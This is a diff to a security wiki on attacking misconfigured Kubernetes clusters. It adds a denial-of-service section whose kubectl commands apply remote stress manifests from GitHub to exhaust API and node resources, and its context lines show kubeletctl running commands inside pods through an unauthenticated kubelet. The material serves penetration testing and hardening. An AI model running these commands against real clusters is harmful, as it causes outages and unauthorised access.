@@ -7,7 +7,10 @@
   - [Kubernetes](#kubernetes)
     - [Retrieving secrets](#retrieving-secrets)
       - [Service Account secrets](#service-account-secrets)
-      - [Interacting with kubelet](#interacting-with-kubelet)
+    - [Interacting with kubelet](#interacting-with-kubelet)
+    - [Causing DoS](#causing-dos)
+      - [For Kubernetes API](#for-kubernetes-api)
+      - [Kubernetes Nodes](#kubernetes-nodes)
 
 This wiki aims to summarize many of the most interesting hacking and discovery approaches to identify and exploit missconfigurations in containerized environments.
 Check [Container Security In Depth](../../container-security-in-depth.md) for understanding proper security measures to be applied to reduce the risk and likelihood of success of an attacker.
@@ -112,7 +115,7 @@ done
 > \[!CAUTION\]
 > Notice that not all the returns are successful. As explained in other chapter, using secure images can reduce the attack surface. There are very limited images such as the ones built from scratch or distroless that do not have even `ls` or `cat` commands available. It could also happen that the system calls are filtered with `seccomp`. Having said that, as you notice in the screenshot, having exec permissions is quite critical to be able to retrieve majority of the secrets of the cluster and therefore the RBAC must be well defined and tight to protect the organization.
 
-#### Interacting with kubelet
+### Interacting with kubelet
 
 If kubelet service is not authorized (it is not common, but could happen) we may be able to interact with the api to compromise the cluster.
 
@@ -171,4 +174,28 @@ kubeletctl pods --server 172.31.41.69
 
 ```bash
 kubeletctl run "<command-inside-container>" -p <pod-id> -c <container-name> -n <namespace>  --server 172.31.41.69
+```
+
+### Causing DoS
+
+#### For Kubernetes API
+
+There is an interesting project available (either not longer being maintained actively) [kube-stresscheck](https://github.com/giantswarm/kube-stresscheck).
+
+Executing it is as simple as:
+
+```bash
+kubectl apply -f https://raw.githubusercontent.com/giantswarm/kube-stresscheck/master/examples/cluster.yaml
+```
+
+#### Kubernetes Nodes
+
+There are as well other projects or utilities that can help to crash kubernetes nodes or the workloads allocated in them if there is no proper strategy of Quality of Service implemented.
+
+For example [container-stress](https://github.com/mohsenmottaghi/container-stress) can fulfill this.
+
+If there are no proper restrictions in place in terms of `limits` for the workloads, executing this container can allow to take all the resources available at the cluster.
+
+```bash
+kubectl apply -f https://raw.githubusercontent.com/mohsenmottaghi/container-stress/master/stress-deployment.yml
 ```
